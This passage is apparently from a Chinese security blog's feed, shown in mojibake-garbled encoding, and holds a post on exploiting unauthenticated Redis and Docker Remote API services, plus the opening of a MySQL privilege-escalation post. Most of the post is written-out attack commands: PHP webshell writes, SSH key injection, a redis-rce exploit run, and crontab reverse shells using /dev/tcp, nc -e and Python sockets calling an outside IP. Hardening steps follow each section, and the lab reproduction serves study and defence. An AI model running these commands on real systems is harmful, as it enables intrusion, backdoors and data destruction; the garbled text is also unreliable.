href="https://www.anquanke.com/post/id/188981">https://www.anquanke.com/post/id/188981</a></p><p><a href="http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æœªæˆæƒè®¿é—®æ€»ç»“</title>
      <link href="2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/"/>
      <url>2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†æœªæˆæƒè®¿é—®çš„ç›¸å…³å†…å®¹ï¼</p><a id="more"></a><h2 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h2><p>æœªæˆæƒè®¿é—®æ¼æ´å¯ä»¥ç†è§£ä¸ºéœ€è¦å®‰å…¨é…ç½®æˆ–æƒé™è®¤è¯çš„åœ°å€ã€æˆæƒé¡µé¢å­˜åœ¨ç¼ºé™·å¯¼è‡´å…¶ä»–ç”¨æˆ·å¯ä»¥ç›´æ¥è®¿é—®ä»è€Œå¼•å‘é‡è¦æƒé™å¯è¢«æ“ä½œã€æ•°æ®åº“æˆ–ç½‘ç«™ç›®å½•ç­‰æ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚</p><h2 id="Redisæœªæˆæƒè®¿é—®"><a href="#Redisæœªæˆæƒè®¿é—®" class="headerlink" title="Redisæœªæˆæƒè®¿é—®"></a>Redisæœªæˆæƒè®¿é—®</h2><h3 id="ç®€ä»‹-1"><a href="#ç®€ä»‹-1" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>Redis æ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„ Key â€“ Value æ•°æ®åº“ã€‚Redis çš„å‡ºç°å¾ˆå¤§ç¨‹åº¦ä¸Šå¼¥è¡¥äº† memcached è¿™ç±» Key/Value å­˜å‚¨çš„ä¸è¶³åœ¨éƒ¨åˆ†åœºåˆå¯ä»¥å¯¹å…³ç³»æ•°æ®åº“èµ·åˆ°å¾ˆå¥½çš„è¡¥å……ä½œç”¨ã€‚</p><p>Redis é»˜è®¤æƒ…å†µä¸‹ä¼šç»‘å®šåœ¨ <code>0.0.0.0:6379</code>ï¼Œè¿™æ ·ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šã€‚åœ¨æ²¡æœ‰å¼€å¯è®¤è¯çš„æƒ…å†µä¸‹ä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªç»æˆæƒå°±è®¿é—®åˆ° Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚</p><p>æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹å¯ä»¥åˆ©ç”¨ Redis çš„ç›¸å…³æ–¹æ³•æˆåŠŸåœ°åœ¨ Redis æœåŠ¡å™¨ä¸Šå†™å…¥å…¬é’¥ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p>Redisæœªæˆæƒè®¿é—®åœ¨4.x/5.0.5ä»¥å‰ç‰ˆæœ¬ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨master/slaveæ¨¡å¼åŠ è½½è¿œç¨‹æ¨¡å—ï¼Œé€šè¿‡åŠ¨æ€é“¾æ¥åº“çš„æ–¹å¼æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p><h3 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>è¿™é‡Œç›´æ¥ç”¨vulhubæ­ä¸€ä¸‹ç¯å¢ƒï¼Œæ­å»ºå¥½ç”¨nampæ‰«ä¸‹,æŸ¥çœ‹ä¸€ä¸‹Redisçš„è¯¦ç»†ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 6379 --script redis-info 47.97.210.141</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200403214810.png" style="zoom: 80%;"><p>ç”±äºç›®æ ‡ç¯å¢ƒæ²¡æœ‰å¼€å¯è®¤è¯(ç©ºå¯†ç )ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç™»é™†è¿›å»</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 47.97.210.141 -p 6379</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200403230731.png" style="zoom:80%;"><p>å¸¸è§çš„Rediså‘½ä»¤(ä¸åŒºåˆ†å¤§å°å†™)ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ping <span class="comment">#æŸ¥çœ‹rediså¯åŠ¨çŠ¶æ€ï¼Œè¿”å›PONGä¸ºæ­£å¸¸</span></span><br><span class="line">key  * ã€€ã€€<span class="comment">#æŸ¥çœ‹redisä¸­çš„æ‰€æœ‰é”®</span></span><br><span class="line">exists  key ã€€ã€€ <span class="comment">#åˆ¤æ–­ä¸€ä¸ªé”®æ˜¯å¦å­˜åœ¨ï¼Œå­˜åœ¨è¿”å›1ï¼Œå¦åˆ™è¿”å›0</span></span><br><span class="line">del  key  [key...] ã€€ã€€ <span class="comment">#åˆ é™¤ä¸€ä¸ªæˆ–å¤šä¸ªé”®ï¼Œè¿”å›åˆ é™¤çš„é”®çš„ä¸ªæ•°</span></span><br><span class="line">type  key ã€€ã€€ <span class="comment">#è·å¾—é”®å€¼çš„æ•°æ®ç±»å‹</span></span><br><span class="line">set  key  valueã€€ã€€<span class="comment">#ç»™é”®èµ‹å€¼</span></span><br><span class="line">mset  key1  v1  key2  v2  key3  v3ã€€ã€€<span class="comment">#åŒæ—¶ç»™å¤šä¸ªé”®èµ‹å€¼</span></span><br><span class="line">get  keyã€€ã€€<span class="comment">#å–å€¼</span></span><br><span class="line">mget  key1  key2  key3ã€€ã€€<span class="comment">#åŒæ—¶è·å–å¤šä¸ªé”®å€¼</span></span><br><span class="line">append  key  valueã€€ã€€<span class="comment">#åœ¨å­—ç¬¦ä¸²åé¢è¿½åŠ å€¼ï¼Œå¦‚æœè¯¥é”®ä¸å­˜åœ¨å³ä¸ºä¸ºè¿™ä¸ªé”®èµ‹å€¼ï¼ˆè¯¥å‘½ä»¤ç¬¬äºŒä¸ªå‚æ•°éœ€è¦åŠ å¼•å·ï¼Œå› ä¸ºæœ‰å¯èƒ½è¿½åŠ ç©ºæ ¼ï¼Œæ‰€ä»¥è¦å¼•èµ·æ¥ï¼‰</span></span><br><span class="line">strlen  keyã€€ã€€<span class="comment">#è¿”å›é”®å€¼çš„é•¿åº¦ï¼Œå¦‚æœä¸å­˜åœ¨è¿”å›0</span></span><br><span class="line">config<span class="comment">#è·å–å’Œè®¾ç½®é…ç½®</span></span><br></pre></td></tr></table></figure><h4 id="ç½‘ç«™å†™é©¬"><a href="#ç½‘ç«™å†™é©¬" class="headerlink" title="ç½‘ç«™å†™é©¬"></a>ç½‘ç«™å†™é©¬</h4><p>å¦‚æœç›®æ ‡æœåŠ¡å¼€çš„æœ‰webæœåŠ¡,å¹¶ä¸”å¯¹åº”ç›®å½•æœ‰å†™çš„æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥è¯•ç€å¾€ç½‘ç«™ç›®å½•å†™ä¸€ä¸ªwebshell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html/</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[1]);?&gt;&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200403235951.png" style="zoom:80%;"><p>å¦‚æœç½‘ç«™ç›®å½•æ²¡æœ‰å†™æƒé™ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨<code>/tmp</code>é‡Œå†™ï¼Œç„¶åæ‰¾æ–‡ä»¶åŒ…å«ä¹‹ç±»çš„æ¼æ´</p><p>çœŸå®ç¯å¢ƒçš„Redisæ•°æ®åº“ä¼šå¾ˆå¤§ï¼Œæˆ‘ä»¬ç›´æ¥saveçš„è¯ä¼šä¿å­˜ä¸€ä¸ªå¾ˆå¤§çš„æ–‡ä»¶ï¼Œè€Œä¸”é‡Œé¢ä¸å…æœ‰å½±å“webshellæ­£å¸¸æ‰§è¡Œçš„å› ç´ ï¼Œå› æ­¤ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ€è·¯å°±æ˜¯å°†Redisä¿å­˜çš„æ–‡ä»¶ä½œä¸ºä¸­é—´æ–‡ä»¶ï¼Œå†ç”¨è¿™ä¸ªä¸­é—´æ–‡ä»¶æ¥å†™shellï¼Œå¹¶ä¸”ä»å¤‡ä»½çš„æ–‡ä»¶é‡Œæ‰¾åˆ°ä¸€ä¸ªé å‰çš„é”®ï¼ŒæŠŠshellå†™å…¥å€¼é‡Œï¼Œå¯ä»¥æ„é€ ç±»ä¼¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">set_time_limit(<span class="number">0</span>);<span class="comment">//å–æ¶ˆæ‰§è¡Œæ—¶é—´é™åˆ¶</span></span><br><span class="line">$fp=fopen(<span class="string">&#x27;wtf.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>);</span><br><span class="line">fwrite($fp,<span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å½“ç„¶æ²¡æœ‰é¡¾è™‘çš„è¯ä¹Ÿå¯ä»¥ç›´æ¥ç”¨<code>flushall</code>åˆ åº“è·‘è·¯</p><h4 id="ç»“åˆSSHå…å¯†ç ç™»å½•"><a href="#ç»“åˆSSHå…å¯†ç ç™»å½•" class="headerlink" title="ç»“åˆSSHå…å¯†ç ç™»å½•"></a>ç»“åˆSSHå…å¯†ç ç™»å½•</h4><p>å¦‚æœRedisä½¿ç”¨rootç”¨æˆ·å¯åŠ¨ï¼Œå¹¶ä¸”å¼€æ”¾äº†SSHæœåŠ¡ï¼Œè€Œä¸”å…è®¸ä½¿ç”¨å¯†é’¥ç™»å½•ï¼Œå³å¯è¿œç¨‹å†™å…¥ä¸€ä¸ªå…¬é’¥ï¼Œç›´æ¥ç™»å½•è¿œç¨‹æœåŠ¡å™¨ã€‚</p><p>åœ¨kali <code>/root/.ssh</code>ç›®å½•ä¸‹æ‰§è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h 47.97.210.141 -p 9997 -x <span class="built_in">set</span> crackit</span><br><span class="line">redis-cli -h 47.97.210.141 -p 9997</span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh/</span><br><span class="line">config <span class="built_in">set</span> dbfilename <span class="string">&quot;authorized_keys&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><h4 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h4><p>è¿™é‡Œç›´æ¥ç”¨githubä¸Šå¤§ä½¬çš„expï¼š<a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p><p>exp.soå¯ä»¥ä»è¿™é‡Œè·å¾—ï¼š<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 redis-rce.py -r 47.97.210.141 -p 9997 -L 47.97.210.141 -f exp.so</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200404180709.png" style="zoom:80%;"><h4 id="è®¡åˆ’ä»»åŠ¡åå¼¹shell"><a href="#è®¡åˆ’ä»»åŠ¡åå¼¹shell" class="headerlink" title="è®¡åˆ’ä»»åŠ¡åå¼¹shell"></a>è®¡åˆ’ä»»åŠ¡åå¼¹shell</h4><p>Redisä»¥rootæƒé™è¿è¡Œæ—¶å¯ä»¥å†™crontabæ¥æ‰§è¡Œå‘½ä»¤åå¼¹shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 47.97.210.141 -p 9997</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/47.97.210.141/4444 0&gt;&amp;1\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /var/spool/cron/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h3 id="é˜²æŠ¤æ‰‹æ®µ"><a href="#é˜²æŠ¤æ‰‹æ®µ" class="headerlink" title="é˜²æŠ¤æ‰‹æ®µ"></a>é˜²æŠ¤æ‰‹æ®µ</h3><p>ä¿®æ”¹<code>redis.conf</code>ç›‘å¬æœ¬æœºåœ°å€<code>127.0.0.1</code></p><p>ä¿®æ”¹<code>redis.conf</code>æ·»åŠ <code>requirepass mypassword</code>è®¾ç½®è®¤è¯</p><p>ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œç¦ç”¨è¿œç¨‹ä¿®æ”¹ DB æ–‡ä»¶åœ°å€</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL <span class="string">&quot;&quot;</span></span><br><span class="line">rename-command CONFIG   <span class="string">&quot;&quot;</span></span><br><span class="line">rename-command <span class="keyword">EVAL</span>     <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>ä»¥ä½æƒé™è¿è¡Œ Redis æœåŠ¡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure><p>iptables</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// accept</span><br><span class="line"><span class="comment">## iptables -A INPUT -p tcp -s 127.0.0.1 --dport 6379 -j ACCEPT</span></span><br><span class="line"><span class="comment">## iptables -A INPUT -p udp -s 127.0.0.1 --dport 6379 -j ACCEPT</span></span><br><span class="line"></span><br><span class="line">// drop</span><br><span class="line"><span class="comment">## iptables -I INPUT -p tcp --dport 6379 -j DROP</span></span><br><span class="line"><span class="comment">## iptables -I INPUT -p udp --dport 6379 -j DROP</span></span><br><span class="line"></span><br><span class="line">// ä¿å­˜è§„åˆ™å¹¶é‡å¯ iptables</span><br><span class="line"><span class="comment">## service iptables save</span></span><br><span class="line"><span class="comment">## service iptables restart</span></span><br></pre></td></tr></table></figure><h2 id="Dockeræœªæˆæƒè®¿é—®"><a href="#Dockeræœªæˆæƒè®¿é—®" class="headerlink" title="Dockeræœªæˆæƒè®¿é—®"></a>Dockeræœªæˆæƒè®¿é—®</h2><h3 id="ç®€ä»‹-2"><a href="#ç®€ä»‹-2" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>Docker æ˜¯ä¸€ä¸ªå¼€æºçš„å¼•æ“å¯ä»¥è½»æ¾åœ°ä¸ºä»»ä½•åº”ç”¨åˆ›å»ºä¸€ä¸ªè½»é‡çº§çš„ã€å¯ç§»æ¤çš„ã€è‡ªç»™è‡ªè¶³çš„å®¹å™¨ã€‚å¼€å‘è€…åœ¨ç¬”è®°æœ¬ä¸Šç¼–è¯‘æµ‹è¯•é€šè¿‡çš„å®¹å™¨å¯ä»¥æ‰¹é‡åœ°åœ¨ç”Ÿäº§ç¯å¢ƒä¸­éƒ¨ç½²åŒ…æ‹¬ VMsã€bare metalã€OpenStack é›†ç¾¤å’Œå…¶ä»–çš„åŸºç¡€åº”ç”¨å¹³å°Dockerã€‚</p><p>Docker Remote API æ˜¯ä¸€ä¸ªå–ä»£è¿œç¨‹å‘½ä»¤è¡Œç•Œé¢ï¼ˆrcliï¼‰çš„REST APIï¼Œç›‘å¬åœ¨<code>0.0.0.0:2375</code>ã€‚å­˜åœ¨é—®é¢˜çš„ç‰ˆæœ¬åˆ†åˆ«ä¸º 1.3 å’Œ 1.6å› ä¸ºæƒé™æ§åˆ¶ç­‰é—®é¢˜å¯¼è‡´å¯ä»¥é€šè¿‡ docker client æˆ–è€… http ç›´æ¥è¯·æ±‚å°±å¯ä»¥è®¿é—®è¿™ä¸ª APIï¼Œé€šè¿‡è¿™ä¸ªæ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥æ–°å»º containerï¼Œåˆ é™¤å·²æœ‰ containerï¼Œç”šè‡³æ˜¯è·å–å®¿ä¸»æœºçš„ shellã€‚</p><h3 id="å¤ç°-1"><a href="#å¤ç°-1" class="headerlink" title="å¤ç°"></a>å¤ç°</h3><p>è¿˜æ˜¯ç”¨Vulhubä¸Šçš„</p><p><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM%E6%88%AA%E5%9B%BE20200405124115.png"></p><p>è®¿é—®<code>/version</code>å¯ä»¥çœ‹åˆ°ç‰ˆæœ¬ä¿¡æ¯</p><p>ä¹Ÿå¯ä»¥ç›´æ¥ç”¨dockerå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://47.97.210.141:9375 version</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200405184112.png" style="zoom:80%;"><p>åŒæ ·æˆ‘ä»¬å¯ä»¥æ‰§è¡Œå…¶å®ƒå‘½ä»¤</p><h4 id="è®¡åˆ’ä»»åŠ¡åå¼¹shell-1"><a href="#è®¡åˆ’ä»»åŠ¡åå¼¹shell-1" class="headerlink" title="è®¡åˆ’ä»»åŠ¡åå¼¹shell"></a>è®¡åˆ’ä»»åŠ¡åå¼¹shell</h4><p>éšæ„å¯åŠ¨ä¸€ä¸ªé•œåƒï¼Œæ²¡æœ‰çš„è¯pullä¸€ä¸ªï¼Œè¿™é‡Œç”¨çš„æ˜¯åŸºäº<code>Alpine Linux</code>çš„è¶…å°å‹Dockeré•œåƒ,å¤§å°åªæœ‰å‡ å…†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://47.97.210.141:9375 pull alpine:latest</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200405194440.png" style="zoom:80%;"><p>æ¥ç€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯åŠ¨å®¹å™¨</span></span><br><span class="line">docker -H tcp://47.97.210.141:9375 run -id -v /:/tmp alpine:latest</span><br><span class="line"><span class="comment"># åˆ—ä¸€ä¸‹æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span></span><br><span class="line">docker -H tcp://47.97.210.141:29375 ps</span><br><span class="line"><span class="comment"># è¿›å…¥å®¹å™¨å¹¶æŠŠ/ç›®å½•æŒ‚è½½åˆ°å®¹å™¨çš„/tmpç›®å½•ä¸‹</span></span><br><span class="line">docker -H tcp://47.97.210.141:9375 <span class="built_in">exec</span> -it 7c99cec3c42a sh</span><br></pre></td></tr></table></figure><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIMæˆªå›¾20200405215112.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æˆåŠŸæŒ‚è½½å¹¶å¯ä»¥è¯»å–æ–‡ä»¶äº†ï¼Œå†™åé—¨ï¼Œç„¶åé€€å‡º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;* * * * * /usr/bin/nc 47.97.210.141 9000 -e /bin/sh&#x27;</span> &gt;&gt; /tmp/etc/crontabs/root</span><br></pre></td></tr></table></figure><p><img src="/2020/04/05/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%80%BB%E7%BB%93/TIM%E6%88%AA%E5%9B%BE20200405220719.png"></p><p>ä¹Ÿå¯ä»¥å†™å…¥å…¶ä»–çš„,è§†ç¯å¢ƒè€Œå®šï¼Œæ¯”å¦‚python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;*/1 * * * * root /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;127.0.0.1\&quot;,8088));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;\n&quot;</span> &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure><p>åŒæ ·ï¼Œå¯ä»¥å°†åå¼¹shellçš„è„šæœ¬å†™å…¥å†™å…¥åˆ°<code>/var/spool/cron/root</code>ï¼ˆcentosç³»ç»Ÿï¼‰æˆ–<code>/var/spool/cron/crontabs/root</code>(ubuntuç³»ç»Ÿ)</p><h4 id="å†™sshå…¬é’¥"><a href="#å†™sshå…¬é’¥" class="headerlink" title="å†™sshå…¬é’¥"></a>å†™sshå…¬é’¥</h4><p>å†™sshå…¬é’¥å’Œä¸Šé¢æ–¹æ³•ç±»ä¼¼ï¼Œéƒ½æ˜¯å†™æ–‡ä»¶å˜›</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure><p>æŠŠæ–‡ä»¶å†…å®¹æ”¾åˆ°ç›®æ ‡ä¸»æœº<code>/root/.ssh/id_rsa.pub</code>æ–‡ä»¶é‡Œå°±è¡Œäº†</p><p>githubä¸Šæœ‰ä¸ªè„šæœ¬ï¼š<a href="https://github.com/Tycx2ry/docker_api_vul">https://github.com/Tycx2ry/docker_api_vul</a></p><p>å¯ä»¥ç›´æ¥æ‰§è¡Œè„šæœ¬å†™è®¡åˆ’ä»»åŠ¡åå¼¹shellç­‰æ“ä½œ</p><h3 id="é˜²æŠ¤æ‰‹æ®µ-1"><a href="#é˜²æŠ¤æ‰‹æ®µ-1" class="headerlink" title="é˜²æŠ¤æ‰‹æ®µ"></a>é˜²æŠ¤æ‰‹æ®µ</h3><p>åœ¨ä¸å¿…éœ€çš„æƒ…å†µä¸‹ï¼Œä¸è¦å¯ç”¨ docker çš„ remote api æœåŠ¡ï¼Œå¦‚æœå¿…é¡»ä½¿ç”¨çš„è¯ï¼Œå¯ä»¥é‡‡ç”¨å¦‚ä¸‹çš„åŠ å›ºæ–¹å¼ï¼š</p><ol><li>è®¾ç½® ACLï¼Œä»…å…è®¸ä¿¡ä»»çš„æ¥æº IP è¿æ¥</li><li>è®¾ç½® TLS è®¤è¯ï¼Œå®˜æ–¹çš„æ–‡æ¡£ä¸º Protect the Docker daemon socket</li></ol><p>ä¿®æ”¹ Docker çš„å¯åŠ¨å‚æ•°ï¼š<br>å®šä½åˆ° DOCKER_OPTS ä¸­çš„ tcp://0.0.0.0:2375ï¼Œå°†0.0.0.0ä¿®æ”¹ä¸º127.0.0.1ï¼Œå°†é»˜è®¤ç«¯å£ 2375 æ”¹ä¸ºè‡ªå®šä¹‰ç«¯å£</p><p>å‚è€ƒï¼š</p><p><a href="https://www.runoob.com/redis/redis-tutorial.html">https://www.runoob.com/redis/redis-tutorial.html</a></p><p><a href="https://www.cnblogs.com/Qsunshine/p/redis.html">https://www.cnblogs.com/Qsunshine/p/redis.html</a></p><p><a href="https://xz.aliyun.com/t/2320">https://xz.aliyun.com/t/2320</a></p><p><a href="https://www.secpulse.com/archives/39440.html">https://www.secpulse.com/archives/39440.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> æœªæˆæƒè®¿é—® </tag>
            
            <tag> Redis </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysqlææƒæ€»ç»“</title>
      <link href="2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/"/>
      <url>2020/03/30/mysql%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†mysqlææƒçš„ç›¸å…³å†…å®¹ï¼</p><a id="more"></a><h2 id="mysqlææƒç®€ä»‹"><a href="#mysqlææƒç®€ä»‹" class="headerlink" title="mysqlææƒç®€ä»‹"></a>mysqlææƒç®€ä»‹</h2><p>æˆ‘ä¸ªäººç†è§£çš„mysqlææƒå°±æ˜¯é€šè¿‡sqlæ³¨å…¥ï¼Œçˆ†ç ´mysqlç”¨æˆ·å¯†ç ç­‰æ–¹å¼ä»è€Œè®©æˆ‘ä»¬å¯ä»¥æ‰§è¡Œsqlè¯­å¥ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šè¾¾åˆ°æ‰§è¡Œå‘½ä»¤ï¼Œè·å–ç”¨æˆ·æƒé™ç­‰ç­‰ï¼</p><h2 id="CVE-2012-2122"><a href="#CVE-2012-2122" class="headerlink" title="CVE-2012-2122"></a>CVE-2012-2122</h2><h3 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>è¯¥æ¼æ´æ˜¯èº«ä»½è®¤è¯ç»•è¿‡æ¼æ´ï¼Œå½“è¿æ¥MariaDB/MySQLæ—¶ï¼Œè¾“å…¥çš„å¯†ç ä¼šä¸æœŸæœ›çš„æ­£ç¡®å¯†ç æ¯”è¾ƒï¼Œç”±äºä¸æ­£ç¡®çš„å¤„ç†ï¼Œä¼šå¯¼è‡´å³ä¾¿æ˜¯memcmp()è¿”å›ä¸€ä¸ªéé›¶å€¼ï¼Œä¹Ÿä¼šä½¿MySQLè®¤ä¸ºä¸¤ä¸ªå¯†ç 